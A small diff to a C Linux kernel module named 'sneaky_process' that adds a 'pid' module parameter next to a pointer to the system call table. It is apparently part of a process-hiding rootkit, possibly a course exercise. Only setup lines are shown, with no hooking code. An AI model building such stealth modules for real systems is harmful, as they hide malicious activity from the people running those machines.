@@ -1,4 +1,5 @@
 #include <linux/module.h>      // for all modules 
+#include <linux/moduleparam.h>
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
 #include <asm/current.h>       // process information
@@ -10,6 +11,9 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
+
+static int pid;
+module_param(pid, int, 0644);
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
